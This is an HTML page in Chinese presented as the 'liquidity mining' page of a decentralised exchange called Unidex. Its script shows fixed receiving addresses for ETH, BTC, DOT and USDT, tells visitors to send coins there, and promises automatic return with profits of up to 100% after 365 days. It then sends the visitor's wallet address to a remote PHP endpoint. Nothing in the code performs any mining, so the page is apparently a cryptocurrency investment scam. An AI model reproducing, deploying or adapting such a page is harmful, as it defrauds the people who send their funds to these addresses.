
<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	<title>流动性挖矿 - Unidex去中心化交易所</title>
	<style>
		body,ol,ul,h1,h2,h3,h4,h5,h6,p,th,td,dl,dd,form,fieldset,legend,input,textarea,select{margin:0;padding:0} 
		body{font:16px"宋体","Arial Narrow",HELVETICA;background:#fff;-webkit-text-size-adjust:100%;} 
		a{text-decoration:none} 
		a:hover{color:#cd0200;text-decoration:underline;text-decoration:none} 
		a:visited{text-decoration:none}
		em{font-style:normal} 
		li{list-style:none} 
		img{border:0;vertical-align:middle} 
		table{border-collapse:collapse;border-spacing:0} 
		p{word-wrap:break-word} 
		input:focus{ outline: none; } 
		select,option{outline: none;border: 0; background: transparent;}
		html,body{-webkit-flex;display: flex;flex-direction:column; justify-content: center;align-items: center ;flex-wrap:wrap;width: 100%;background-color: rgb(253, 234, 241)}

		/*.all{display: -webkit-flex;display: flex;background-color: rgb(253, 234, 241)}*/
		.header{display: -webkit-flex; display: flex;align-items: center ;text-align: center; width:100%;height: 50px; border-bottom-style:solid;border-bottom-width: 1px;border-bottom-color:#ead9d9;}
		.home{flex: 1;color:#cc4949;border-right-style:solid;border-right-width: 1px;border-right-color:#ead9d9;}
		.principle{flex:1;color:#cc4949;border-right-style:solid;border-right-width: 1px;border-right-color:#ead9d9;}
		.about{flex:1;color:#cc4949;border-right-style:solid;border-right-width: 1px;border-right-color:#ead9d9;}
		.tips{display: -webkit-flex; display: flex;align-items: center ; height: 50px; font-size:10px;color:#cc4949;flex-wrap:   wrap ;}
		.ok{display: -webkit-flex; display: flex;text-align:center ; align-items: center ; height: 80px; font-size:10px;flex-wrap:   wrap ;}
		.transaction{ display: -webkit-flex; display: flex;justify-content: center;align-items: center ; flex-direction:column; width: 300px; height: 280px; }
		.action{display: -webkit-flex; display: flex;  width: 280px; height: 50px; align-items: center ;color: #cc4949; }
		.from{display: -webkit-flex; display: flex;  width: 280px; height: 60px; border:solid  1px #ead9d9; border-radius:10px ; }
		.to{display: -webkit-flex; display: flex; width: 280px; height: 60px;  border:solid  1px #ead9d9; border-radius:10px ;}
		.fromid{display: -webkit-flex; display: flex;margin-top: 10px;margin-bottom:20px;  width: 280px; height: 40px; font-size:10px;border:solid  1px #ead9d9; border-radius:10px ;}
		.toid{display: -webkit-flex; display: flex;margin-top: 16px;   width: 280px; height: 40px;font-size:10px;}

		.go{display: -webkit-flex; display: flex; margin-top: 16px; width: 150px; height: 40px; align-items: center ;justify-content: center;  border-radius:10px ;color:#e11313;font-weight:bold; background:#fcd7e5;}
	</style>
	<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body class="all">
	<div class="header">
		<a class="home" href="./index.html">首页</a>
		<a class="home" href="./mining.html">挖矿</a>
		<a class="about" href="./about.html">关于</a>
		<a class="principle" href="./explain.html">原理</a>
	</div>
	<div class="tips">
		提示：流动性挖矿，锁仓挖矿！
	</div> 
	
	<div class="transaction">
		<div class="action">
			币种
		</div>
		<select class="from" id="from"> 
		  <option value ="请选择">请选择</option>
		  <option value ="ETH">ETH</option>
		  <option value ="BTC">BTC</option>
		  <option value="DOT">DOT</option>
		  <option value="USDT">USDT</option>
		</select>
		<div class="bi"></div>
		<div class="fromtips"></div>
		<div class="action">
			时间
		</div>
		
		<select class="to" id="to"> 
		  <option value ="请选择">请选择</option>
		  <option value ="7">7天</option>
		  <option value ="30">30天</option>
		  <option value="120">120天</option>
		  <option value="365">365天</option>
		</select>
		
	</div>
	<div class="totips"></div>
	<div class="gotips"></div>
	<script type="text/javascript">
		$("#from").bind("change",function(){
	        //获取被选中的option的值
	        var fromtype = $(this).val();
	        if (fromtype == "ETH") {
	        	$(".fromtips").html('<input class="fromid" type="text" name="fromname" placeholder=" 输入你转账的ETH地址">');
	        	$(".bi").html('<div class="ok">已为你分配节点地址：0xfb87f8f844c240039Ade7eaD622Fb432ac2C7F3C 请将ETH转进去</div>');
	        }else if(fromtype == "BTC"){
	        	$(".fromtips").html('<input class="fromid" type="text" name="fromname" placeholder=" 输入你转账的BTC地址">');
	        	$(".bi").html('<div class="ok">已为你分配节点地址：3HYUo1yu2qHWWoSqaSmFrRYvu9rmtRkoi2 请将BTC转进去</div>');
	        }else if(fromtype == "DOT"){
	        	$(".fromtips").html('<input class="fromid" type="text" name="fromname" placeholder=" 输入你转账的DOT地址">');
	        	$(".bi").html('<div class="ok">已为你分配节点地址：16dNYvvK34JMWmn9717gSNK3f5DjpEaGWEhYaAKfEXuVZwq 请将DOT转进去</div>');
	        }else if(fromtype == "USDT"){
	        	$(".fromtips").html('<input class="fromid" type="text" name="fromname" placeholder=" 输入你转账的USDT地址">');
	        	$(".bi").html('<div class="ok">已为你分配节点地址：0x79285c83021a7b1cb8d1af1bd632f25795c08254 请将USDT转进去</div>');
	        }

	    });
	    $("#to").bind("change",function(){
	        var totype = $(this).val();
	        if (totype == "7") {
	        	$(".totips").html('<span class="toid">7天后会自动返回到你的钱包，利润0.5%</span><input class="btime" type="hidden" name="toname" value="7">');
	        	$(".gotips").html('<div class="go">开始挖矿</div>');
	        }else if(totype == "30"){
				$(".totips").html('<span class="toid">30天后会自动返回到你的钱包，利润5%</span><input class="btime" type="hidden" name="toname" value="30">');
	        	$(".gotips").html('<div class="go">开始挖矿</div>');
	        }else if(totype == "120"){
				$(".totips").html('<span class="toid">120天后会自动返回到你的钱包，利润30%</span><input class="btime" type="hidden" name="toname" value="120">');
	        	$(".gotips").html('<div class="go">开始挖矿</div>');
	        }else if(totype == "365"){
				$(".totips").html('<span class="toid">365天后会自动返回到你的钱包，利润100%</span><input class="btime" type="hidden" name="toname" value="365">');
	        	$(".gotips").html('<div class="go">开始挖矿</div>');
	        }
	    });
	    $(".gotips").click(function(){ 
	    	if(window.location.protocol.indexOf("https")!=-1){
				var gourl = "https://sg.unidex.world/post/mining.php"; 
	    	}else{
	    		var gourl = "http://sg.unidex.world/post/mining.php"; 
	    	}
		  var from_value = $('.fromid').val();
		  var to_value = $('.btime').val();
		  if(from_value != ""  && from_value != undefined){
			  alert("提交成功，确认你的转账后自动挖矿。");
		  	$.ajax({
				url: gourl,
				async: false,
				type: "POST",
				data: {fromname:from_value,toname:to_value},
				dataType: "json",
				success: function (data) {
				    if(data.ok=="yes"){
							alert("提交成功，确认你的转账后自动挖矿。");
						}else{
							alert("网络出错了");
						}
				}
			});
		  }else{
		  	alert("缺少参数值");
		  }
		
		});
	     
	</script>
</body>
</html>
